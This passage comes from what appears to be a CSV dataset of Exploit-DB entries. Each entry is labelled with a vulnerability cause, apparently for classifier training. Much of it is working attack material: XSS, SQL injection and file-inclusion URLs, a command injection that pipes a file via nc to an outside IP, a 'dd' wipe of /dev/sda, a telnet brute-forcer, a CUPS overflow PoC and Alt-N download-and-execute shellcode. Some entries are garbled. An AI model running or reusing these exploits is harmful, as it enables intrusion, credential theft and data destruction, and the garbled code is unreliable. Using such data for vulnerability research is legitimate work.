"".$path.""users.php HTTP/1.1\r\n"";   print $sock ""Host: "".$serv.""\r\n"";   print $sock ""Content-Length: "".length($data).""\r\n"";   print $sock ""Cookie: gl_session=%27"".$shell.""\r\n"";   print $sock ""Connection: Close\r\n\r\n"";   print $sock $data;   close($sock);    $sock = IO::Socket::INET->new(Proto=>""tcp"", PeerAddr=>""$serv"", Timeout  => 10, PeerPort=>""http(80)"")   or die ""[+] Connecting ... Could not connect to host.\n\n"";    $xpl=""../logs/error.log"";   $xpl=urlEncode($xpl).""%00"";   print $sock ""GET "".$path.""index.php?ind="".$cmd.""%00 HTTP/1.1\r\n"";   print $sock ""Host: "".$serv.""\r\n"";   print $sock ""Cookie: language="".$xpl."";\r\n"";   print $sock ""Connection: Close\r\n\r\n"";    while ($answer = <$sock>) {     print $answer;   }   close($sock);",fails to properly sanitize user-supplied input,1
31362,"Neptune Web Server 3.0 - 404 Error Page Cross-Site Scripting source: https://www.securityfocus.com/bid/28148/info  Neptune Web Server is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.  Neptune Web Server Professional Edition 3.0 is vulnerable; other versions may also be affected.  http://www.example.com/<IMG SRC=""javascript:alert('XSS');"">",fails to properly sanitize user-supplied input,1
27633,"MyBB 1.10 - 'member.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/17492/info  MyBB is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.   An attacker may leverage this issue to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  Version 1.10 is vulnerable; other versions may also be affected.  http://www.example.com/mybb/member.php?action=do_login&username=[usrname]&password=[pass]&url=""><script>alert(1);</script>",fails to properly sanitize user-supplied input,1
30396,"Ditto Forensic FieldStation 2013Oct15a - Multiple Vulnerabilities ************************************************************** Title: Ditto Forensic FieldStation, multiple vulnerabilities Versions affected: <= 2013Oct15a (all) Vendor: CRU Wiebetech Discovered by: Martin Wundram Email: wundram@digitrace.de Date found:     2013-04-22 Date published: 2013-12-12 Status: partially patched **************************************************************   0] ======== Introduction / Background / Impact ======== In computer forensics (http://en.wikipedia.org/wiki/Computer_forensics) one essential requirement is that evidence data does not get modified at all (or  not unnoticed, at least). Therefore IT forensic experts use write-blockers to  ensure a read-only access to evidence data like hard disks or USB mass  storage.  The Ditto Forensic FieldStation is such a special equipment (hardware with embedded software) used by forensic experts to analyse and copy evidence data  in a safe and secure way. The ditto is explicitly marketed as a device to  acquire data from network file shares, too. This means it is meant to be  connected to possibly hostile networks of suspects.  However it was found to be vulnerable up to the point of not being reliable as  a computer forensic device.   1] ======== OS Command Injection ======== Class: Command Injection [CWE-77] Impact: Code execution Remotely Exploitable: Yes CVE Name: CVE-2013-6881 CVSS v2 Base Score: 10 Overall CVSS v2 Score: 9.2 CVSS v2 Vector: (AV:N/AC:L/Au:N/C:C/I:C/A:C/E:H/RL:O/RC:C/CDP:MH/TD:ND/CR:H/IR:H/AR:L)  Several input fields of the web application are vulnerable to OS command injection. E.g. the application allows the setting of parameters like 'sector size' or 'skip count' for a forensic imaging task. Because of improper neutralization in combination with the web server running with root  privileges, an attacker is able to access and manipulate the complete system.  Example 1 (setting of 'sector size' = 1 with malicious content):    1;cat /opt/web/htdocs/index.php | nc 192.168.1.1 6666;  Example 2 (setting of 'set-size' = 1 with copying a PHP shell from   the external SD card):    1;cp /ditto/shell.php /opt/web/htdocs;   2] ======== Persistent XSS ======== Class: Cross-site Scripting [CWE-79] Impact: Code execution Remotely Exploitable: Yes Status: unpatched CVE Name: CVE-2013-6882 CVSS v2 Base Score: 9 Overall CVSS v2 Score (if patched): 9.2 CVSS v2 Vector: (AV:N/AC:L/Au:N/C:P/I:C/A:P/E:H/RL:O/RC:C/CDP:MH/TD:ND/CR:H/IR:H/AR:L) Overall CVSS v2 Score (unpatched): 10  The web application suffers from multiple vulnerabilities regarding XSS. The first one (a) is critical because an unauthorized attacker is able to push malicious code into the system and consequently attacking every user. The  other ones (b) need authentication first.  a) The web application logs every login (including the username) in a not sanitized way to a system log. Additionally, the web application embeds that system log rendered as HTML into the start page of every user who successfully logs in. Thus an unprivileged attacker can persistently inject malicious code which attacks all users of the vulnerable system immediately after their  login.  Example:   POSTDATA=    user=demo%3Cscript%3Ealert%281%29%3B%3C%2Fscript%3E                            &pass=demo&login=Log+In   b) It is easily possible to submit malicious data as input into multiple HTML form fields (e.g. one can force the system to load externally hosted  JavaScript code with <script src=http://www.hacker.tld/code.js></script>).  This can result in dangerous situations where the (external) JavaScript code  mangles the information displayed about important computer forensic key values  whose integrity is crucial.  Example:     784 PetaByte (PB) source disk instead of 32 GB, investigator ""Al Capone"",      ""verify actions: yes"" instead of ""no"", ...   3] ======== Cross-Site Request Forgery ======== Class: Cross-Site Request Forgery [CWE-352] Impact: Application misuse Remotely Exploitable: Yes CVE Name: CVE-2013-6883 CVSS v2 Base Score: 6.6 Overall CVSS v2 Score: 8 CVSS v2 Vector: (AV:N/AC:H/Au:N/C:P/I:C/A:P/E:H/RL:O/RC:C/CDP:MH/TD:ND/CR:H/IR:H/AR:L)  The web application is vulnerable to attacks using Cross-Site Request Forgery. E.g. the disk erase technique (correct settings are important for the reliable deletion of sensitive forensic data) can be changed with a simple POST  request.   4] ======== Misconfigured Daemon Rights ======== Class: Configuration [CWE-16] Impact: Full system access  The web server lighthttpd and the PHP engine are run as user 'root'. Thus injection weaknesses in the 'ditto' web application result in immediate full system access.   5] ======== Unneeded Daemons/Software ======== Class: Configuration [CWE-16] Impact: Attackable services Best matching CCE-ID: CCE-4268-9  Forensic usage needs only write-blocking and imaging of evidence data.  However, the base system contains further active software and services. This  helps attacking the system and escalating privileges. The tools/daemons are  especially netcat and an active SSHd. Furthermore, the SSHd binds to the  network port which is labeled as 'source' and thus intended for usage in  supposedly hostile network environments - the network containing evidence data  from suspects.   6] ======== Use of standard credentials ======== Class: Use of Hard-coded Credentials [CWE-798] Impact: unwanted full system access Remotely Exploitable: Yes CVE Name: CVE-2013-6884 CVSS v2 Base Score: 10 Overall CVSS v2 Score: 9.2 CVSS v2 Vector: (AV:N/AC:L/Au:N/C:C/I:C/A:C/E:H/RL:O/RC:C/CDP:MH/TD:ND/CR:H/IR:H/AR:L)  The ditto write-blocker contains a default system user named 'ditto' with the default password 'ditto' which is allowed to elevate its user rights to root (sudo) without further authentication. In combination with the active SSHd,  this vulnerability allows attackers full access to the ditto if it gets  connected to the same/reachable network.   7] ======== Misconfigured Core System ======== Class: Configuration [CWE-16] Impact: Alteration of evidence data Remotely Exploitable: Yes  Although explicitly marketed as a hardware write-blocker, the ditto does not implement any specific write-blocking mechanism at all. The underlying system  is able to manipulate or even erase evidence on devices which are connected to  the 'source side' of the ditto. The problem is: no hardware-level, no driver- level and no kernel-level (blockdev) write-blocking are implemented. Only the  web application prevents the user from writing to the source media. That is  just security by obscurity. Finally, every critical weakness or simple  malfunction in the web application can potentiallly lead to overwriting of  source/evidence data.   Furthermore, the embedded Linux system itself mounts the system partition as writable. Thus malware could be persistently deployed!  Example:   One can simply overwrite supposedly write-protected source data (USB stick  and SATA disk) with      dd if=/dev/zero of=/dev/sda.   8] ======== Solution ======== Upgrade your ditto to the newest available firmware (2013Oct15a). Don't  connect the device to potentially hostile networks. Examine your device if it  has been manipulated at an earlier time (has someone placed a backdoor in the  embedded Linux, or a malware which silently manipulates evidence data or  copies of evidence data?).   9] ======== Report Timeline ======== 2013-04-22 Discovery of vulnerabilities 2013-04-23 First contact with vendor including agreement about later public            disclosure 2013-04-26 Detailed information about vulnerabilities provided to vendor 2013-06-30 Vendor fixes some vulnerabilities with firmware 2013Jun30a 2013-10-15 Vendor fixes some vulnerabilities with firmware 2013Oct15a 2013-11-26 Information with details provided to vendor about upcoming public            disclosure. Vendor gave feedback regarding technical accuracy of            this report 2013-12-12 Public disclosure   10] ======== Discussion ======== Because integrity is of utmost importance during the forensic process (correct handling of evidence data and correct deduction of conclusions and implications), even small vulnerabilities in forensic tools and devices become critical.   11] ======== References ======== a) http://www.cru-inc.com/support/software-downloads/ditto-firmware- updates/ditto-firmware-release-notes-2013oct15a/ b) http://www.cru-inc.com/support/software-downloads/ditto-firmware- updates/ditto-firmware-release-notes-2013jun30a/   --  Diplom-Wirtschaftsinformatiker Martin G. Wundram  DigiTrace GmbH - Kompetenz in IT-Forensik Geschäftsführer: Alexander Sigel, Martin Wundram Registergericht Köln, HR B 72919 USt-IdNr: DE278529699  Zollstockgürtel 59, 50969 Köln Telefon: 0221-6 77 86 95-0 Website: www.DigiTrace.de E-Mail: info@DigiTrace.de",improper neutralization in combination with the web server running with root privileges,1
21011,"3Com SuperStack II PS Hub 40 - TelnetD Weak Password Protection source: https://www.securityfocus.com/bid/3034/info  A vulnerability exists in certain models of 3Com hubs and potentially other 3Com network products.  The affected devices fail to properly restrict the allowed number of login attempts to the inbuilt telnet-based administration interface from remote users. Attackers can use brute-force cracking techniques in obtaining access to 3Com telnetd config accounts.  Exploiting this, a malicious user can interfere with the device's operation and configuration, creating denials of service and further compromising the network on which the device is installed.   #!/usr/bin/perl -w  #######################esponsible for any damgae caused  # # by the########################################### rf, chr(13), chr(10);  recv(SOCK,$ol,1,0); $passwd,0);     }    recv(SOCK,$ol,1,0);  $i++ } $i=1; } print ""\n\nIt's sad but true, you failed.\n""; }   print ""\n3Com Hardware Telnet Login Cracker, written by Siberian \- Sentry Research Labs\n\n""; print ""Get the latest Version at www.sentry-labs.com\n\n [target host] [dictionary] (username)""; $us= inet_aton($remote) or die ""No target host computer found!""; $paddr = sockaddr_in(23, $iesspass();  close(FILE1); close(SOCK); exit 0;",fail to properly restrict the allowed number of login attempts to the inbuilt telnet-based administration interface from remote users,1
33305,"OpenDocMan 1.2.5 - 'view_file.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/36777/info            OpenDocMan is prone to an SQL-injection vulnerability and multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.            Exploiting these issues could allow an attacker to steal cookie-based authentication credentials, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.            OpenDocMan 1.2.5 is vulnerable; other versions may also be affected.   http://www.example.com/opendocman/view_file.php/""><script>alert(1)</script><""?aku=aWQ9NiZzdGF0ZT0z",fails to sufficiently sanitize user-supplied data,1
20774,"Microsoft Internet Explorer 5.5 - CLSID File Execution source: https://www.securityfocus.com/bid/2612/info  The default operation performed to open a filetype is determining by referencing the filetype's CLSID. Due to a flaw in the interpretation of CLSIDs when appended to a filename, it is possible to specify a different default action for a given file than would normally be used. As a result, seemingly harmless files (.txt, .jpg etc) may be opened in a nonstandard, attacker specified manner. For example, a program (""evil.exe"") could be renamed ""evil.jpg.{CLSID_of_executables}"" and when opened by the target user, this file will be executed instead of opened by their default .jpg viewer.   https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/20774.zip",a flaw in the interpretation of CLSIDs when appended to a filename,1
26514,PHPWCMS 1.2.5 -DEV - Multiple Cross-Site Scripting Vulnerabilities source: https://www.securityfocus.com/bid/15440/info  phpwcms is prone to multiple cross-site scripting vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.  An attacker may leverage these issues to have arbitrary script code executed in the browser of an unsuspecting user in the context of the affected site. This may facilitate the theft of cookie-based authentication credentials as well as other attacks.   http://www.example.com/phpwcms/include/inc_act/act_newsletter.php?i=V:target@example.com:<script>alert(document.cookie)</script>) http://www.example.com/phpwcms/include/inc_act/act_newsletter.php?text=<script>alert(document.cookie)</script>,a failure in the application to properly sanitize user-supplied input,1
28023,Confixx 3.0/3.1 - 'FTP_index.php' Cross-Site Scripting source: https://www.securityfocus.com/bid/18426/info  Confixx is prone to a cross-site scripting vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input.   An attacker may leverage this issue to have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.  http://www.example.com/[confixx]/ftplogin/[user]/ftp_index.php?path=<script>alert(&#039;p0w3r%20ruLeZ&#039;)</script>,a failure in the application to properly sanitize user-supplied input,1
30898,"Common UNIX Printing System 1.2/1.3 SNMP - 'asn1_get_string()' Remote Buffer Overflow source: https://www.securityfocus.com/bid/26917/info  Common UNIX Printing System (CUPS) is prone to a remote buffer-overflow vulnerability because the software fails to properly bounds-check user-supplied data before copying it to an insufficiently sized buffer.  Exploiting this issue allows attackers to execute arbitrary machine code in the context of users running the affected software. Failed exploit attempts will likely result in denial-of-service conditions.  This issue affects CUPS 1.2 and 1.3, prior to 1.3.5; other versions may also be vulnerable.  P0C: === #!/usr/bin/perl #if 0 # backend_snmp_poc.pl write by wei_wang@mcafee.com # 2007-11-06 # # snmp.c asn1_get_string integer overflow cups 1.3.4 # #    packet->error = ""No community name""; #  else if ((length = asn1_get_length(&bufptr, bufend)) == 0) #    packet->error = ""Community name uses indefinite length""; #  else #  { #    asn1_get_string(&bufptr, bufend, length, packet->community, #                    sizeof(packet->community)); # #    if ((packet->request_type = asn1_get_type(&bufptr, bufend)) # #002a: 30 38  tag=0x30 len=0x38 #002c: 02 01 00                 version:1 (0) #002f: 04 84 ff ff ff ff 69 63       community:public #len is 0xffffffff #endif  my $payload =""\x30\x38\x02\x01\x00\x04\x84\xff\xff\xff\xff\x41\x41"";  use strict; my $PF_INET=2; my $SOCK_DGRAM=2; my $port=161; my $proto=getprotobyname('udp'); my $addres=pack('SnC4x8',$PF_INET,$port,0,0,0,0); my ($Cmd); socket(SOCKET,$PF_INET,$SOCK_DGRAM,$proto) or die ""Can't build a socket""; bind (SOCKET,$addres); while(1) {   my $rip=recv (SOCKET,$Cmd,100,0);   send (SOCKET,$payload,0,$rip) or die ""send false"";   print ""$Cmd""; }",the software fails to properly bounds-check user-supplied data before copying it to an insufficiently sized buffer,1
36248,"osCommerce - Arbitrary File Upload / File Disclosure source: https://www.securityfocus.com/bid/50301/info  osCommerce is prone to a remote file upload and a file disclosure vulnerability. The issues occur because the application fails to adequately sanitize user-supplied input.  An attacker can exploit these issues to upload a file and obtain an arbitrary file's content; other attacks are also possible.   The following URL is available for the file disclosure vulnerability:  http://www.example.com/admin/shop_file_manager.php/login.php/login.php?action=download&filename=/includes/_includes_configure.php  The following exploit is available for the remote file upload vulnerability:   <html><head><title> creloaded - Remote File Upload </title></head> <br><br><u>UPLOAD FILE:</u><br> <form name=""file"" action=""https://www.example.com/admin/shop_file_manager.php/login.php?action=processuploads"" method=""post"" enctype=""multipart/form-data""> <input type=""file"" name=""file_1""><br> <input name=""submit"" type=""submit"" value="" Upload "" > </form> <br><u>CREATE FILE:</u><br> <form name=""new_file"" action=""https://www.example.com/admin/shop_file_manager.php/login.php?action=save"" method=""post""> FILE NAME:<br> <input type=""text"" name=""filename"">&nbsp; (ex. shell.php)<br>FILE CONTENTS:<br> <textarea name=""file_contents"" wrap=""soft"" cols=""70"" rows=""10"">&lt;/textarea&gt; <input name=""submit"" type=""submit"" value="" Save "" > </form>",the application fails to adequately sanitize user-supplied input,1
26584,"vTiger CRM 4.2 Leads Module - 'record' Cross-Site Scripting source: https://www.securityfocus.com/bid/15562/info  vtiger CRM is prone to multiple input validation vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.  vTiger CRM is prone to multiple SQL injection, HTML injection, cross-site scripting and local file include vulnerabilities.  An attacker can exploit these issues to gain administrative access, retrieve username and password pairs, steal cookie-based authentication credentials and retrieve arbitrary local files in the context of the Web server process; other attacks are also possible.  Some of these issues may be related to those discussed in BID 11740 (SugarCRM Multiple Input Validation Vulnerabilities) discovered by James Bercegay and Damon Wood of the GulfTech Security Research Team, as vtiger is a fork of the SugarCRM project.  An independent study by Daniel Fabian of SEC-CONSULT has confirmed the existence of several of these issues. Please see the referenced advisory for more information.   http://www.example.com/index.php?action=DetailView&module=Leads&record=%3Cscript%3Ealert('document.cookie')%3C/script%3E",a failure in the application to properly sanitize user-supplied input,1
37520,Maian Survey - '/index.php' URI redirection / Local File Inclusion source: https://www.securityfocus.com/bid/54613/info  Maian Survey is prone to a URI-redirection vulnerability and a local file-include vulnerability because it fails to sufficiently sanitize user-supplied data.  An attacker can exploit these vulnerabilities to execute arbitrary local files within the context of the webserver process or redirect users to a potentially malicious site. This may aid in phishing attacks or allow the attacker to compromise the application; other attacks are also possible.  Maian Survey 1.1 is vulnerable; other versions may also be affected.   http://www.example.com/[PATH]/admin/index.php?cmd=LFÃ?Â°_here,fails to sufficiently sanitize user-supplied data,1
15645,"enano CMS 1.1.7pl1 - Multiple Vulnerabilities Vulnerability ID: HTB22709 Reference: http://www.htbridge.ch/advisory/sql_injection_in_enano_cms.html Product: Enano CMS Vendor: enanocms.org ( http://enanocms.org/ )  Vulnerable Version: 1.1.7pl1 Vendor Notification: 16 November 2010  Vulnerability Type: SQL Injection Status: Fixed by Vendor Risk level: High  Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/)   SQL Injection: Vulnerability Details: The vulnerability exists due to failure in the ""/index.php"" script to properly sanitize user-supplied input in email variable. Attacker can alter queries to the application SQL database, execute arbitrary queries to the database, compromise the application, access or modify sensitive data, or exploit various vulnerabilities in the underlying SQL database.  The following PoC is available:  Step1. Register new user with email: ""any@email.com'SQL_CODE""  Step2. Log in with new login and password. Solution: Upgrade to the most recent version  Path Disclosure: Vulnerability Details: The vulnerability exists due to failure in the ""/index.php"" script to properly sanitize user-supplied input in ""title"" variable, it's possible to generate an error that will reveal the full path of the script. A remote user can determine the full path to the web root directory and other potentially sensitive information.  The following PoC is available:   http://[host]/index.php?title=Special:Captcha/1 http://[host]/index.php?title[]=1  Solution: Upgrade to the most recent version","failure in the ""/index.php"" script to properly sanitize user-supplied input in email variable",1
23068,"file sharing for net 1.5 - Directory Traversal source: https://www.securityfocus.com/bid/8513/info  File Sharing for Net is said to be prone to a directory traversal vulnerability, potentially allowing users to disclose the contents of system files. The problem occurs due to the application failing to parse user-supplied input for directory traversal sequences (../), thus making it possible to access files outside of the established web root.  http://www.example.org/../../../autoexec.bat","the application failing to parse user-supplied input for directory traversal sequences (../),",1
36791,"CMS Faethon 1.3.4 - 'articles.php' Multiple SQL Injections source: https://www.securityfocus.com/bid/52053/info  CMS Faethon is prone to multiple SQL-injection vulnerabilities because it fails to sufficiently sanitize user-supplied data before using it in an SQL query.  Exploiting these issues could allow an attacker to compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database.  CMS Faethon 1.3.4 is vulnerable; other versions may also be affected.   http://www.example.com/articles.php?by_author=[SQL] http://www.example.com/article.php?id=[SQL]",fails to sufficiently sanitize user-supplied data before using it in an SQL query,1
28378,miniBloggie 1.0 - 'Fname' Remote File Inclusion source: https://www.securityfocus.com/bid/19476/info  miniBloggie is prone to a remote file-include vulnerability because it fails to properly sanitize user-supplied input.  An attacker can exploit this issue to include an arbitrary remote file containing malicious PHP code and execute it in the context of the webserver process. This may facilitate a compromise of the application and the underlying system; other attacks are also possible.  Version 1.0 is reported vulnerable; other versions may also be affected.  http://www.example.com/[miniBloggie]/cls_fast_template.php?fname=attacker's site,fails to properly sanitize user-supplied input,1
26457,Microsoft Internet Explorer 6 - Malformed HTML Parsing Denial of Service (1) source: https://www.securityfocus.com/bid/15268/info  Microsoft Internet Explorer is affected by a denial of service vulnerability. This issue arises because the application fails to properly parse certain malformed HTML content.  An attacker may exploit this issue by enticing a user to visit a malicious site resulting in a denial of service condition in the application.  Few details are available at this time; this BID will be updated as further information is disclosed.   https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/26457.zip,the application fails to properly parse certain malformed HTML content,1
31071,VB Marketing - 'tseekdir.cgi' Local File Inclusion source: https://www.securityfocus.com/bid/27475/info  VB Marketing is prone to a local file-include vulnerability because it fails to properly sanitize user-supplied input.  An attacker can exploit this vulnerability using directory-traversal strings to include local script code in the context of the application. This may allow the attacker to access sensitive information that may aid in further attacks.   http://www.example.com/cgi-bin/tseekdir.cgi?location=/etc/passwd%00,fails to properly sanitize user-supplied input,1
36363,WordPress Plugin Skysa App Bar - 'idnews' Cross-Site Scripting source: https://www.securityfocus.com/bid/50824/info  Skysa App Bar Plugin for WordPress is prone to a cross-site-scripting vulnerability because it fails to properly sanitize user-supplied input.  An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.   http://www.example.com/[path]/wp-content/plugins/skysa-official/skysa.php?submit=[xss],fails to properly sanitize user-supplied input,1
20708,"Clipbucket 2.5 - Blind SQL Injection # Author: loneferret of Offensive Security # Product: ClipBucket # Version: 2.5 (and maybe older versions) # Vendor Site: http://clip-bucket.com/ # Software Download: http://sourceforge.net/projects/clipbucket/  # Software description: # ClipBucket is an OpenSource Multimedia Management Script Provided Free to the Community.This script comes with all # the bells & whistles required to start your own Video Sharing website like Youtube, Metacafe, Veoh, Hulu or any # other top video distribution application in matter of minutes. ClipBucket is fastest growing script which was # first started as Youtube Clone but now its advance features & enhancements makes it the most versatile, reliable & # scalable media distribution platform with latest social networking features, while staying light on your pockets. # Whether you are a small fan club or a big Multi Tier Network operator, Clipbucket will fulfill your video # management needs.   # Vulnerability: # Blind SQLi # Due to improperly sanitized user input a SQL Injection is present in the ""Forgot Password"" page.  # PoC: # Page: http://<server>/forgot.php # Field: Username # Payload: -1' or sleep(5) and '1'='1  # Host: 172.16.194.148 # User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:14.0) Gecko/20100101 Firefox/14.0.1 # Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 # Accept-Language: en-us,en;q=0.5 # Accept-Encoding: gzip, deflate # DNT: 1 # Connection: keep-alive # Referer: http://172.16.194.148/upload/forgot.php # Cookie: quick_list_box=show; current_style=list_view; sess_salt=5f3f5; fws_guest=81172578; sk-id=-305383665; PHPSESSID=0c1519dace9f217955cdc58ac55b28b2 # Content-Type: application/x-www-form-urlencoded # Content-Length: 68  # forgot_username=-1%27+or+sleep%285%29+and+%271%27%3D%271&reset=Reset","improperly sanitized user input a SQL Injection is present in the ""Forgot Password"" page",1
27017,"Chimera Web Portal 0.2 - 'linkcategory.php?id' SQL Injection source: https://www.securityfocus.com/bid/16113/info   Chimera Web Portal is prone to multiple input validation vulnerabilities. The issues include cross-site scripting and SQL injection vulnerabilities. These issues are due to a failure in the application to properly sanitize user-supplied input.   Successful exploitation of these vulnerabilities could result in a compromise of the application, disclosure or modification of data, the theft of cookie-based authentication credentials. They may also permit an attacker to exploit vulnerabilities in the underlying database implementation as well as other attacks.   http://www.example.com/chimera/linkcategory.php?id=9999'%20union%20select%20admin_password%20from%20admin/*",a failure in the application to properly sanitize user-supplied input,1
33106,"PG Matchmaking - 'browse_ladies.php?show' Cross-Site Scripting source: https://www.securityfocus.com/bid/35808/info  PG Matchmaking is prone to multiple cross-site scripting vulnerabilities because it fails to sufficiently sanitize user-supplied data.  An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may allow the attacker to steal cookie-based authentication credentials and to launch other attacks.   http://www.example.com/browse_ladies.php?show=""><script>alert(document.cookie);</script>",fails to sufficiently sanitize user-supplied data,1
22834,"Alt-N WebAdmin 2.0.x - 'USER' Remote Buffer Overflow (2) // source: https://www.securityfocus.com/bid/8024/info   Alt-N WebAdmin is prone to a buffer overflow condition. This is due to insufficient bounds checking on the USER parameter. Successful exploitation could result in code execution with SYSTEM level privileges.  /* WebAdmin.dll remote download exec shellcode. Works on 2.0.3 and 2.0.4 all windows sp's. Oh and my previous exploit, i'm an idiot and 2.0.5 *is* the patch, heh.  This shellcode was used by ThreaT in his vulnreg.reg exploit, it works quite nicely. Look at the bottom of the code for some trojan.exe idea's. That one i found somewhere but i can't remember. shellcode has one minor suck point, it shows a window on the target host, oh and the exploit crashes the server, so make a user account and restart the service. Be Kind. word to Mark Litchfield for finding this, i suggest anyone who is interested in learning win32 exploitation download this and attempt to exploit it, it's easier than you think. don't download directly from alt-n, they patched all of their 'archived' versions. heh. shouts to innercircle you little kittens you.... -wire  */  #include <winsock2.h> #include <stdio.h> #define snprintf _snprintf // <-- a big fuck you to ms.  #pragma comment(lib,""ws2_32"")   char sc[700] =      ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""     ""\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90""     ""\x68\x5E\x56\xC3\x90\x8B\xCC\xFF\xD1\x83\xC6\x0E\x90\x8B\xFE\xAC""      ""\x34\x99\xAA\x84\xC0\x75\xF8""// download and exec ala ThreaT vulnreg exploit.     ""\x72\xeb\xf3\xa9\xc2\xfd\x12\x9a\x12\xd9\x95\x12\xd1\x95\x12\x58\x12\xc5\xbd\x91""     ""\x12\xe9\xa9\x9a\xed\xbd\x9d\xa1\x87\xec\xd5\x12\xd9\x81\x12\xc1\xa5\x9a\x41\x12""     ""\xc2\xe1\x9a\x41\x12\xea\x85\x9a\x69\xcf\x12\xea\xbd\x9a\x69\xcf\x12\xca\xb9\x9a""     ""\x49\x12\xc2\x81\xd2\x12\xad\x03\x9a\x69\x9a\xed\xbd\x8d\x12\xaf\xa2\xed\xbd\x81""     ""\xed\x93\xd2\xba\x42\xec\x73\xc1\xc1\xaa\x59\x5a\xc6\xaa\x50\xff\x12\x95\xc6\xc6""     ""\x12\xa5\x16\x14\x9d\x9e\x5a\x12\x81\x12\x5a\xa2\x58\xec\x04\x5a\x72\xe5\xaa\x42""     ""\xf1\xe0\xdc\xe1\xd8\xf3\x93\xf3\xd2\xca\x71\xe2\x66\x66\x66\xaa\x50\xc8\xf1\xec""     ""\xeb\xf5\xf4\xff\x5e\xdd\xbd\x9d\xf6\xf7\x12\x75\xc8\xc8\xcc\x66\x49\xf1\xf0\xf5""     ""\xfc\xd8\xf3\x97\xf3\xeb\xf3\x9b\x71\xcc\x66\x66\x66\xaa\x42\xca\xf1\xf8\xb7\xfc""     ""\xe1\x5f\xdd\xbd\x9d\xfc\x12\x55\xca\xca\xc8\x66\xec\x81\xca\x66\x49\xaa\x42\xf1""     ""\xf0\xf7\xdc\xe1\xf3\x98\xf3\xd2\xca\x71\xb5\x66\x66\x66\x14\xd5\xbd\x89\xf3\x98""     ""\xc8\x66\x49\xaa\x42\xf1\xe1\xf0\xed\xc9\xf3\x98\xf3\xd2\xca\x71\x8b\x66\x66\x66""     ""\x66\x49\x71\xe6\x66\x66\x66"";   struct sockaddr_in victim; int main(int argc, char **argv) {     SOCKET s;     WSADATA wsadata;     int x;     unsigned int i;     DWORD jmpesp4 = 0x1005d58d; // jmp esp from 2.0.4 webAdmin.dll...     DWORD jmpesp3 = 0x10071c43; // jmp esp from 2.0.3 webAdmin.dll...      char exp_buf[5000];     char post[] =          ""POST /WebAdmin.dll?View=Logon HTTP/1.1\r\n""         ""Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/x-shockwave-flash, */*\r\n""         ""Accept-Language: en-us\r\n""         ""Content-Type: application/x-www-form-urlencoded\r\n""         ""Accept-Encoding: gzip, deflate\r\n""         ""User-Agent: Your Mom\r\n""         ""Host: sh0dan.org\r\n"";          char rest[] =             ""Connection: Keep-Alive\r\n""         ""Cache-Control: no-cache\r\n""         ""Cookie: User=test; Lang=en; Theme=Standard\r\n\r\nUser="";      char o_args[] =          ""&Password=foo&languageselect=en&Theme=Heavy&Logon=Sign+In\r\n\r\n"";          if (argc != 5) {         fprintf(stderr, ""WebAdmin from Alt-N remote LocalSystem exploit.\n"");         fprintf(stderr, ""Werd to Mark Litchfield for finding this easily exploited hole\n"");         fprintf(stderr, ""supports version 2.0.3 and 2.0.4 on any sp.\n"");         fprintf(stderr, ""Usage: %s <victim> <port> <url> <version> where version is 3 or 4\n"", argv[0]);         fprintf(stderr, ""Ex: %s 192.168.0.1 1000 http://heh.com/trojan.exe 4\n"", argv[0]);          exit(1);     }       WSAStartup(MAKEWORD(2,0),&wsadata);     victim.sin_port = htons(atoi(argv[2]));     victim.sin_addr.s_addr = inet_addr(argv[1]);     victim.sin_family = AF_INET;       memset(exp_buf, 0x00, 5000);          for (i = 0; i < strlen(argv[3]); argv[3][i++] ^=0x99);    // xor our url.      strncat(sc, argv[3], 100); // strcat the xor'd address onto sc.     strncat(sc, ""\x99"", 1); // xor'd 00     snprintf(exp_buf, 2000, ""%sContent-Length: %d\r\n%s"", post, (strlen(sc)+strlen(rest)+168), rest);      x = strlen(exp_buf);     memset(exp_buf+x, 0x90, 168);     x += 168;      if(atoi(argv[4]) == 4) {         memcpy(exp_buf+x, &jmpesp4, 4);         x += 4;     } else if (atoi(argv[4]) == 3) {         memcpy(exp_buf+x, &jmpesp3, 4);         x += 4;     } else {         fprintf(stderr, ""uhm unknown version, try 3 or 4\n"");         exit(1);     }      memcpy(exp_buf+x, sc, strlen(sc));     x += strlen(sc);          memcpy(exp_buf+x, o_args, strlen(o_args));     x += strlen(o_args);     exp_buf[x+1] = 0x00;      s = WSASocket(AF_INET,SOCK_STREAM,NULL,NULL,NULL,NULL);     if(connect(s, (struct sockaddr *)&victim, sizeof(victim)) < 0) {         fprintf(stderr,""error couldn't connect\n""); 	exit(1);     }     send(s, exp_buf, x, 0);     printf(""sent!\n"");     return(0); }   /* ripped from somewhere, sorry i forget where i got this. #include <winsock2.h> #include <stdio.h> #pragma comment(lib,""ws2_32"")  #define PORT 53 #define IP 192.168.0.21 void main(int argc, char *argv[]) {         WSADATA wsaData;                 SOCKET hSocket;         STARTUPINFO si;         